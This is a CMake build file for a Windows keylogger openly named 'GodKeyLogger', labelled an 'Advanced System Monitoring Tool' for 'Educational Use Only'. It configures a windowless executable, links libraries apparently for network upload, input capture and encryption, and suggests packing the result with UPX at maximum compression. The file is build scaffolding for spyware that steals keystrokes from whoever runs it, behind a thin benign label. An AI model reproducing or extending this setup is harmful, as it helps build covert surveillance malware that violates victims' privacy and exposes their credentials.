cmake_minimum_required(VERSION 3.15)
project(GodKeyLogger VERSION 2.0.0)

# Metadata
set(PROJECT_DESCRIPTION "Advanced System Monitoring Tool")
set(PROJECT_AUTHOR "Security Research")
set(PROJECT_LICENSE "Educational Use Only")

# Compiler settings
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Windows-specific settings
if(WIN32)
    add_definitions(-DWIN32_LEAN_AND_MEAN -DUNICODE -D_UNICODE)
    
    # Release mode optimizations
    set(CMAKE_CXX_FLAGS_RELEASE "/MT /O2 /Oi /GL /DNDEBUG")
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "/LTCG /OPT:REF /OPT:ICF")
    
    # Debug mode
    set(CMAKE_CXX_FLAGS_DEBUG "/MTd /Od /Zi /RTC1")
    set(CMAKE_EXE_LINKER_FLAGS_DEBUG "/DEBUG /INCREMENTAL")
    
    # Common flags
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /EHsc /W3 /wd4996")
endif()

# Source files
set(SOURCES
    GodKeyLogger.cpp
)

# Create executable
add_executable(GodKeyLogger WIN32 ${SOURCES})

# Set properties
set_target_properties(GodKeyLogger PROPERTIES
    OUTPUT_NAME "GodKeyLogger"
    RUNTIME_OUTPUT_NAME "GodKeyLogger"
    WIN32_EXECUTABLE TRUE
    COMPILE_FLAGS "/D_WIN32_WINNT=0x0600"
)

# Link libraries (Windows)
target_link_libraries(GodKeyLogger
    winhttp
    user32
    gdi32
    advapi32
    crypt32
)

# Install instructions (for development)
if(CMAKE_INSTALL_PREFIX_INITIALIZED_TO_DEFAULT)
    set(CMAKE_INSTALL_PREFIX "${CMAKE_BINARY_DIR}/install" CACHE PATH "..." FORCE)
endif()

install(TARGETS GodKeyLogger
    RUNTIME DESTINATION bin
    BUNDLE DESTINATION .
)

# Post-build event to compress with UPX (optional)
add_custom_command(TARGET GodKeyLogger POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Build complete: $<TARGET_FILE:GodKeyLogger>"
    COMMAND ${CMAKE_COMMAND} -E echo "To compress: upx --best --ultra-brute $<TARGET_FILE:GodKeyLogger>"
)
